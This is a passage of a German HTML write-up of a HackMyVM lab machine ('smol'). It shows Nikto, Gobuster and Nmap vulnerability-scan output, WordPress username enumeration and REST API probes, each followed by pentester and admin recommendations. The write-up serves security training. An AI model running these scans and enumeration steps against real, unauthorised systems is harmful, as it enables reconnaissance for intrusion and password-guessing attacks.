++ 8074 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2025-02-10 23:07:33 (GMT1) (16 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Dies ist der Nikto-Scan, der nun korrekt gegen den Hostnamen `http://www.smol.hmv` ausgeführt wird. Nikto interagiert jetzt mit der eigentlichen Webanwendung.</p>
+            <p class="evaluation">**Bewertung:** Dieser Scan liefert deutlich mehr verwertbare Informationen:
+*   **WordPress:** Nikto identifiziert eindeutig eine WordPress-Installation (Header `x-redirect-by: WordPress`, `Link`-Header zur WP-JSON API, Funde wie `/wp-login.php`, `/wp-content/uploads/`, `/license.txt`, `/wp-links-opml.php`). Dies ist eine entscheidende Erkenntnis.
+*   **Sicherheitsmängel:** Bestätigt erneut fehlende Header (`X-Frame-Options`, `X-Content-Type-Options`) und die veraltete Apache-Version. Findet zusätzlich ein Test-Cookie ohne `HttpOnly`-Flag, was es anfällig für Diebstahl durch XSS machen könnte.
+*   **Informationslecks:** Das Upload-Verzeichnis (`/wp-content/uploads/`) ist browsebar (Directory Indexing), was potenziell sensible hochgeladene Dateien offenlegen könnte. `/wp-links-opml.php` kann die WordPress-Version verraten.
+*   **Plugins:** Hinweise auf das Akismet-Plugin gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokussieren Sie die weitere Enumeration auf WordPress. Verwenden Sie spezialisierte Tools wie `wpscan`. Untersuchen Sie das Upload-Verzeichnis manuell auf interessante Dateien. Notieren Sie die gefundenen Schwachstellen (fehlende Header, browsebares Verzeichnis) für den Bericht.<br>**Empfehlung (Admin):** Deaktivieren Sie Directory Indexing auf dem Webserver (`Options -Indexes` in Apache). Setzen Sie das `HttpOnly`-Flag für alle Cookies. Aktualisieren Sie WordPress, Themes und Plugins regelmäßig. Entfernen Sie unnötige Dateien wie `license.txt` oder `readme.txt` von öffentlich zugänglichen Pfaden. Sichern Sie die WordPress-Loginseite (`/wp-login.php`) zusätzlich ab (z.B. durch IP-Whitelisting, Zwei-Faktor-Authentifizierung, Fail2Ban).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://$IP" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
+                     <pre>
+<span class="command">http://192.168.2.164/index.php</span>            (Status: 302) [Size: 0] [-&gt; http://www.smol.hmv]</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Gobuster wird hier verwendet, um nach Verzeichnissen und Dateien auf dem Webserver zu suchen (Directory/File Brute-Forcing). `-u "http://$IP"`: Ziel ist die IP-Adresse. `-w ...`: Verwendet eine gängige Wortliste. `-x ...`: Sucht nach Dateien mit diesen spezifischen Endungen. `-b '503,404,403'`: Blendet diese Statuscodes aus (üblicherweise "nicht gefunden" oder "verboten"). `-e`: Erweitertes Format (zeigt die volle URL). `--no-error`: Unterdrückt Fehler beim Verbindungsaufbau. `-k`: Ignoriert SSL-Zertifikatsfehler (hier irrelevant).</p>
+            <p class="evaluation">**Bewertung:** Ähnlich wie bei Nikto führt der Scan gegen die IP-Adresse ins Leere. Gobuster findet nur `/index.php`, welches wie erwartet mit einem Status 302 auf `http://www.smol.hmv` weiterleitet. Dieser Scan liefert keine neuen Informationen über die eigentliche Webanwendung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Gobuster (oder ein ähnliches Tool wie `ffuf` oder `dirsearch`) erneut aus, diesmal gegen den korrekten Hostnamen `http://www.smol.hmv`. Passen Sie die Wortliste und die gesuchten Erweiterungen ggf. an den Kontext (WordPress) an.<br>**Empfehlung (Admin):** Es gibt keine direkte Maßnahme gegen Brute-Force-Scans auf Verzeichnisse, außer sensible Pfade nicht nach Standardmustern zu benennen und sicherzustellen, dass keine unnötigen Dateien oder Verzeichnisse im Web-Root liegen. Intrusion Detection/Prevention Systeme (IDS/IPS) können solche Scans erkennen und blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::: Nmap Portscans Ende :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::: Nmap Schwachstellenscan Scan :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+                                                                                             </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Dies sind Trennlinien im Berichtstext, die das Ende der initialen Portscans und den Beginn eines dedizierten Schwachstellenscans mit Nmap markieren.</p>
+            <p class="evaluation">**Bewertung:** Rein strukturelle Elemente zur Gliederung des Berichts.</p>
+            <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Handlung erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -A --script vuln 192.168.2.144 -T5</span></div>
+                     <pre>
+:::::::::::::::::::::::: Nmap Schwachstellenscan Scan ::::::::::::::::::::::
+
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 23:09 CET
+Pre-scan script results:
+| broadcast-avahi-dos:
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  <span class="password">Hosts are all up (not vulnerable).</span>
+Nmap scan report for <span class="command">smol.hmv (192.168.2.164)</span>
+Host is up (0.00018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span>
+| vulners:
+|   cpe:/a:openbsd:openssh:8.2p1:
+|     	95499236-C9FE-56A6-9D7D-E943A24B633A	10.0	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	<span class="password">*EXPLOIT*</span>
+|     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	10.0	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	<span class="password">*EXPLOIT*</span>
+|     	<span class="command">CVE-2023-38408</span>	9.8	https://vulners.com/cve/CVE-2023-38408
+|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	<span class="password">*EXPLOIT*</span>
+|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	<span class="password">*EXPLOIT*</span>
+|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	<span class="password">*EXPLOIT*</span>
+|     	887EB570-27D3-11EE-ADBA-C80AA9043978	9.8	https://vulners.com/freebsd/887EB570-27D3-11EE-ADBA-C80AA9043978
+|     	5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	9.8	https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	<span class="password">*EXPLOIT*</span>
+|     	33D623F7-98E0-5F75-80FA-81AA666D1340	9.8	https://vulners.com/githubexploit/33D623F7-98E0-5F75-80FA-81AA666D1340	<span class="password">*EXPLOIT*</span>
+|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	<span class="password">*EXPLOIT*</span>
+|     	PACKETSTORM:179290	8.1	https://vulners.com/packetstorm/PACKETSTORM:179290	<span class="password">*EXPLOIT*</span>
+
+<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-dombased-xss: <span class="password">Couldn't find any DOM based XSS.</span>
+| vulners:
+|   cpe:/a:apache:http_server:2.4.41:
+|     	95499236-C9FE-56A6-9D7D-E943A24B633A	10.0	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	<span class="password">*EXPLOIT*</span>
+|     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	10.0	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	<span class="password">*EXPLOIT*</span>
+|     	F607361B-6369-5DF5-9B29-E90FA29DC565	9.8	https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565	<span class="password">*EXPLOIT*</span>
+|     	EDB-ID:51193	9.8	https://vulners.com/exploitdb/EDB-ID:51193	<span class="password">*EXPLOIT*</span>
+|     	<span class="command">CVE-2024-38476</span>	9.8	https://vulners.com/cve/CVE-2024-38476
+|     	<span class="command">CVE-2024-38474</span>	9.8	https://vulners.com/cve/CVE-2024-38474
+|     	<span class="command">CVE-2023-25690</span>	9.8	https://vulners.com/cve/CVE-2023-25690
+|     	<span class="command">CVE-2022-31813</span>	9.8	https://vulners.com/cve/CVE-2022-31813
+|     	<span class="command">CVE-2022-23943</span>	9.8	https://vulners.com/cve/CVE-2022-23943
+|     	<span class="command">CVE-2022-22720</span>	9.8	https://vulners.com/cve/CVE-2022-22720
+|     	<span class="command">CVE-2021-44790</span>	9.8	https://vulners.com/cve/CVE-2021-44790
+|     	<span class="command">CVE-2021-39275</span>	9.8	https://vulners.com/cve/CVE-2021-39275
+|     	<span class="command">CVE-2021-26691</span>	9.8	https://vulners.com/cve/CVE-2021-26691
+|     	<span class="command">CVE-2020-11984</span>	9.8	https://vulners.com/cve/CVE-2020-11984
+|     	CNVD-2022-51061	9.8	https://vulners.com/cnvd/CNVD-2022-51061
+|     	CNVD-2022-03225	9.8	https://vulners.com/cnvd/CNVD-2022-03225
+|     	CNVD-2021-102386	9.8	https://vulners.com/cnvd/CNVD-2021-102386
+|     	B02819DB-1481-56C4-BD09-6B4574297109	9.8	https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109	<span class="password">*EXPLOIT*</span>
+|     	A5425A79-9D81-513A-9CC5-549D6321897C	9.8	https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C	<span class="password">*EXPLOIT*</span>
+|     	5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	9.8	https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	<span class="password">*EXPLOIT*</span>
+|     	3F17CA20-788F-5C45-88B3-E12DB2979B7B	9.8	https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B	<span class="password">*EXPLOIT*</span>
+|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214	<span class="password">*EXPLOIT*</span>
+|     	1337DAY-ID-34882	9.8	https://vulners.com/zdt/1337DAY-ID-34882	<span class="password">*EXPLOIT*</span>
+|     	CVE-2024-38475	9.1	https://vulners.com/cve/CVE-2024-38475
+|     	CVE-2022-28615	9.1	https://vulners.com/cve/CVE-2022-28615
+|     	CVE-2022-22721	9.1	https://vulners.com/cve/CVE-2022-22721
+|     	CNVD-2022-51060	9.1	https://vulners.com/cnvd/CNVD-2022-51060
+|     	CNVD-2022-41638	9.1	https://vulners.com/cnvd/CNVD-2022-41638
+|     	2EF14600-503F-53AF-BA24-683481265D30	9.1	https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30	<span class="password">*EXPLOIT*</span>
+|     	0486EBEE-F207-570A-9AD8-33269E72220A	9.1	https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A	<span class="password">*EXPLOIT*</span>
+|     	DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6	9.0	https://vulners.com/githubexploit/DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6	<span class="password">*EXPLOIT*</span>
+|     	CVE-2022-36760	9.0	https://vulners.com/cve/CVE-2022-36760
+|     	CVE-2021-40438	9.0	https://vulners.com/cve/CVE-2021-40438
+|     	CNVD-2022-03224	9.0	https://vulners.com/cnvd/CNVD-2022-03224
+|     	AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	9.0	https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	<span class="password">*EXPLOIT*</span>
+|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	9.0	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	<span class="password">*EXPLOIT*</span>
+|     	893DFD44-40B5-5469-AC54-A373AEE17F19	9.0	https://vulners.com/githubexploit/893DFD44-40B5-5469-AC54-A373AEE17F19	<span class="password">*EXPLOIT*</span>
+|     	7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	9.0	https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	<span class="password">*EXPLOIT*</span>
+|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	9.0	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	<span class="password">*EXPLOIT*</span>
+|     	4373C92A-2755-5538-9C91-0469C995AA9B	9.0	https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B	<span class="password">*EXPLOIT*</span>
+|     	36618CA8-9316-59CA-B748-82F15F407C4F	9.0	https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F	<span class="password">*EXPLOIT*</span>
+|     	CVE-2021-44224	8.2	https://vulners.com/cve/CVE-2021-44224
+|     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	<span class="password">*EXPLOIT*</span>
+|     	PACKETSTORM:176334	7.5	https://vulners.com/packetstorm/PACKETSTORM:176334	<span class="password">*EXPLOIT*</span>
+|     	PACKETSTORM:171631	7.5	https://vulners.com/packetstorm/PACKETSTORM:171631	<span class="password">*EXPLOIT*</span>
+|     	F7F6E599-CEF4-5E03-8E10-FE18C4101E38	7.5	https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38	<span class="password">*EXPLOIT*</span>
+|     	E606D7F4-5FA2-5907-B30E-367D6FFECD89	7.5	https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89	<span class="password">*EXPLOIT*</span>
+|     	E5C174E5-D6E8-56E0-8403-D287DE52EB3F	7.5	https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F	<span class="password">*EXPLOIT*</span>
+|     	DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	7.5	https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	<span class="password">*EXPLOIT*</span>
+|     	CVE-2024-40898	7.5	https://vulners.com/cve/CVE-2024-40898
+|     	CVE-2024-39573	7.5	https://vulners.com/cve/CVE-2024-39573
+|     	CVE-2024-38477	7.5	https://vulners.com/cve/CVE-2024-38477
+|     	CVE-2024-27316	7.5	https://vulners.com/cve/CVE-2024-27316
+|     	CVE-2023-31122	7.5	https://vulners.com/cve/CVE-2023-31122
+|     	CVE-2023-27522	7.5	https://vulners.com/cve/CVE-2023-27522
+|     	CVE-2022-30556	7.5	https://vulners.com/cve/CVE-2022-30556
+|     	CVE-2022-29404	7.5	https://vulners.com/cve/CVE-2022-29404
+|     	CVE-2022-26377	7.5	https://vulners.com/cve/CVE-2022-26377
+|     	CVE-2022-22719	7.5	https://vulners.com/cve/CVE-2022-22719
+|     	CVE-2021-36160	7.5	https://vulners.com/cve/CVE-2021-36160
+|     	CVE-2021-34798	7.5	https://vulners.com/cve/CVE-2021-34798
+|     	CVE-2021-33193	7.5	https://vulners.com/cve/CVE-2021-33193
+|     	CVE-2021-26690	7.5	https://vulners.com/cve/CVE-2021-26690
+|     	CVE-2020-9490	7.5	https://vulners.com/cve/CVE-2020-9490
+|     	CVE-2020-13950	7.5	https://vulners.com/cve/CVE-2020-13950
+|     	CVE-2020-11993	7.5	https://vulners.com/cve/CVE-2020-11993
+|     	CVE-2006-20001	7.5	https://vulners.com/cve/CVE-2006-20001
+|     	CNVD-2024-20839	7.5	https://vulners.com/cnvd/CNVD-2024-20839
+|     	CNVD-2023-93320	7.5	https://vulners.com/cnvd/CNVD-2023-93320
+|     	CNVD-2023-80558	7.5	https://vulners.com/cnvd/CNVD-2023-80558
+|     	CNVD-2022-53584	7.5	https://vulners.com/cnvd/CNVD-2022-53584
+|     	CNVD-2022-41639	7.5	https://vulners.com/cnvd/CNVD-2022-41639
+|     	CNVD-2022-03223	7.5	https://vulners.com/cnvd/CNVD-2022-03223
+|     	C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B	7.5	https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B	<span class="password">*EXPLOIT*</span>
+|     	BD3652A9-D066-57BA-9943-4E34970463B9	7.5	https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9	<span class="password">*EXPLOIT*</span>
+|     	B5E74010-A082-5ECE-AB37-623A5B33FE7D	7.5	https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D	<span class="password">*EXPLOIT*</span>
+|     	B0208442-6E17-5772-B12D-B5BE30FA5540	7.5	https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540	<span class="password">*EXPLOIT*</span>
+|     	A820A056-9F91-5059-B0BC-8D92C7A31A52	7.5	https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52	<span class="password">*EXPLOIT*</span>
+|     	A66531EB-3C47-5C56-B8A6-E04B54E9D656	7.5	https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656	<span class="password">*EXPLOIT*</span>
+|     	A0F268C8-7319-5637-82F7-8DAF72D14629	7.5	https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629	<span class="password">*EXPLOIT*</span>
+|     	9814661A-35A4-5DB7-BB25-A1040F365C81	7.5	https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81	<span class="password">*EXPLOIT*</span>
+|     	788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D	7.5	https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D	<span class="password">*EXPLOIT*</span>
+|     	5A864BCC-B490-5532-83AB-2E4109BB3C31	7.5	https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31	<span class="password">*EXPLOIT*</span>
+|     	4B14D194-BDE3-5D7F-A262-A701F90DE667	7.5	https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667	<span class="password">*EXPLOIT*</span>
+|     	45D138AD-BEC6-552A-91EA-8816914CA7F4	7.5	https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4	<span class="password">*EXPLOIT*</span>
+|     	17C6AD2A-8469-56C8-BBBE-1764D0DF1680	7.5	https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680	<span class="password">*EXPLOIT*</span>
+|     	1337DAY-ID-38427	7.5	https://vulners.com/zdt/1337DAY-ID-38427	<span class="password">*EXPLOIT*</span>
+|     	1337DAY-ID-35422	7.5	https://vulners.com/zdt/1337DAY-ID-35422	<span class="password">*EXPLOIT*</span>
+|     	CVE-2023-38709	7.3	https://vulners.com/cve/CVE-2023-38709
+|     	CVE-2020-35452	7.3	https://vulners.com/cve/CVE-2020-35452
+|     	CNVD-2024-36395	7.3	https://vulners.com/cnvd/CNVD-2024-36395
+|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	<span class="password">*EXPLOIT*</span>
+|     	0095E929-7573-5E4A-A7FA-F6598A35E8DE	6.8	https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE	<span class="password">*EXPLOIT*</span>
+|     	CVE-2020-1927	6.1	https://vulners.com/cve/CVE-2020-1927
+|     	CVE-2023-45802	5.9	https://vulners.com/cve/CVE-2023-45802
+|     	CVE-2020-13938	5.5	https://vulners.com/cve/CVE-2020-13938
+|     	CVE-2022-37436	5.3	https://vulners.com/cve/CVE-2022-37436
+|     	CVE-2022-28614	5.3	https://vulners.com/cve/CVE-2022-28614
+|     	CVE-2022-28330	5.3	https://vulners.com/cve/CVE-2022-28330
+|     	CVE-2021-30641	5.3	https://vulners.com/cve/CVE-2021-30641
+|     	CVE-2020-1934	5.3	https://vulners.com/cve/CVE-2020-1934
+|     	CVE-2019-17567	5.3	https://vulners.com/cve/CVE-2019-17567
+|     	CNVD-2023-30859	5.3	https://vulners.com/cnvd/CNVD-2023-30859
+|     	CNVD-2022-53582	5.3	https://vulners.com/cnvd/CNVD-2022-53582
+|_    	CNVD-2022-51059	5.3	https://vulners.com/cnvd/CNVD-2022-51059
+| http-wordpress-users:
+| Username found: <span class="command">admin</span>
+| Username found: <span class="command">wp</span>
+| Username found: <span class="command">think</span>
+|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-stored-xss: <span class="password">Couldn't find any stored XSS vulnerabilities.</span>
+|_http-csrf: <span class="password">Couldn't find any CSRF vulnerabilities.</span>
+| http-enum:
+|   <span class="command">/wp-login.php</span>: Possible admin folder
+|   <span class="command">/readme.html</span>: Wordpress version: 2
+|   <span class="command">/wp-includes/images/rss.png</span>: Wordpress version 2.2 found.
+|   <span class="command">/wp-includes/js/jquery/suggest.js</span>: Wordpress version 2.5 found.
+|   <span class="command">/wp-includes/images/blank.gif</span>: Wordpress version 2.6 found.
+|   <span class="command">/wp-includes/js/comment-reply.js</span>: Wordpress version 2.7 found.
+|   <span class="command">/wp-login.php</span>: Wordpress login page.
+|   <span class="command">/wp-admin/upgrade.php</span>: Wordpress login page.
+|_  <span class="command">/readme.html</span>: Interesting, a readme.
+MAC Address: <span class="command">08:00:27:57:82:F0 (Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.8, Linux 5.0 - 5.5</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.18 ms smol.hmv (192.168.2.164)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 66.28 seconds</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dieser Nmap-Scan verwendet die Option `--script vuln`, um eine breite Palette von Skripten auszuführen, die nach bekannten Schwachstellen suchen. Er kombiniert dies mit Versionserkennung (`-sV`) und erweiterter Erkennung (`-A`). `-T5` beschleunigt den Scan. *Hinweis: Die IP-Adresse im Befehl `192.168.2.144` scheint ein Tippfehler zu sein, die Ausgabe bezieht sich aber korrekt auf `192.168.2.164 (smol.hmv)`.*</p>
+            <p class="evaluation">**Bewertung:** Der Scan liefert eine Fülle potenzieller Schwachstellen, die hauptsächlich durch das `vulners`-Skript identifiziert wurden, das die erkannten Dienstversionen mit Datenbanken bekannter CVEs (Common Vulnerabilities and Exposures) und Exploits abgleicht:
+*   **SSH (OpenSSH 8.2p1):** Mehrere CVEs und Exploits werden aufgelistet, darunter `CVE-2023-38408` (Remote Code Execution unter bestimmten Umständen).
+*   **HTTP (Apache 2.4.41):** Eine sehr lange Liste von CVEs und Exploits wird angezeigt, was auf die veraltete Version zurückzuführen ist. Viele haben hohe CVSS-Scores (9.0-10.0).
+*   **WordPress:** Das Skript `http-wordpress-users` konnte die Benutzernamen `admin`, `wp` und `think` extrahieren. `http-enum` findet Hinweise auf verschiedene WordPress-Versionen und interessante Dateien/Pfade.
+*   **Keine direkten XSS/CSRF-Funde:** Die Skripte `http-dombased-xss`, `http-stored-xss` und `http-csrf` fanden keine offensichtlichen Schwachstellen dieser Art.
+*   **Avahi:** Das Pre-Scan-Skript testete auf eine alte Avahi DoS-Schwachstelle (CVE-2011-1002), die hier nicht zutrifft.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Priorisieren Sie die Untersuchung der gemeldeten Schwachstellen, insbesondere die mit hohen Scores und verfügbaren Exploits (gekennzeichnet mit `*EXPLOIT*`). Recherchieren Sie `CVE-2023-38408` für SSH und einige der hoch bewerteten Apache-CVEs genauer. Die gefundenen WordPress-Benutzernamen (`admin`, `wp`, `think`) sind wertvoll für Brute-Force-Angriffe oder Passwort-Guessing. Führen Sie `wpscan` für eine detailliertere WordPress-Analyse durch.<br>**Empfehlung (Admin):** Dringend Apache und OpenSSH auf die neuesten Versionen aktualisieren! Überprüfen Sie die WordPress-Installation auf nicht benötigte Benutzer und härten Sie die Konfiguration. Implementieren Sie ein Web Application Firewall (WAF), um Angriffe auf bekannte Schwachstellen zu blockieren. Überwachen Sie Logs auf verdächtige Aktivitäten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/wp-json/WP/V2/users/1</span></div>
+                     <pre>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;<span class="password">404 Not Found</span>&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at www.smol.hmv Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser `curl`-Befehl versucht, Informationen über den WordPress-Benutzer mit der ID 1 über die WP-JSON-REST-API abzurufen. Der Endpunkt `/wp-json/wp/v2/users/` ist ein Standard-Endpunkt in WordPress, der Benutzerinformationen offenlegen kann, wenn er nicht richtig gesichert ist.</p>
+             <p class="evaluation">**Bewertung:** Der Server antwortet mit `404 Not Found`. Dies deutet darauf hin, dass entweder dieser spezifische API-Pfad (`/wp-json/WP/V2/users/1`) auf diesem Server nicht existiert oder der Zugriff darauf blockiert ist. Es ist möglich, dass der Pfad geringfügig anders ist (z.B. durch `index.php` davor).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie alternative Pfade für die WP-JSON-API, wie z.B. `http://www.smol.hmv/index.php/wp-json/wp/v2/users/1`. Überprüfen Sie die vom Nikto- oder Nmap-Scan gelieferten Hinweise auf den korrekten API-Pfad.<br>**Empfehlung (Admin):** Wenn die REST-API nicht für anonyme Benutzer benötigt wird, sollte der Zugriff darauf eingeschränkt werden (z.B. durch Webserver-Regeln oder WordPress-Sicherheitsplugins), um Informationslecks über Benutzer zu verhindern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/wp-json/WP/V2/users/2</span></div>
+                     <pre>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;<span class="password">404 Not Found</span>&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at www.smol.hmv Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Identisch zum vorherigen Versuch, nur diesmal wird versucht, Informationen über den Benutzer mit ID 2 abzurufen.</p>
+             <p class="evaluation">**Bewertung:** Wieder ein `404 Not Found`. Bestätigt, dass dieser spezifische API-Pfad nicht funktioniert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Gleiche Empfehlung wie zuvor: Versuchen Sie den alternativen Pfad mit `index.php`.<br>**Empfehlung (Admin):** Gleiche Empfehlung wie zuvor.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre> Posted on August 16, 2023 by <span class="command">Jose Mario Llado Marti</span>	</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser Text scheint ein Zitat oder eine Notiz aus dem Inhalt der Webseite zu sein, wahrscheinlich aus einem Blogbeitrag.</p>
+             <p class="evaluation">**Bewertung:** Es enthüllt einen potenziellen Benutzernamen oder zumindest den Namen eines Autors: "Jose Mario Llado Marti". Dies korreliert mit dem Benutzernamen "think", der später über die API gefunden wird.</p>
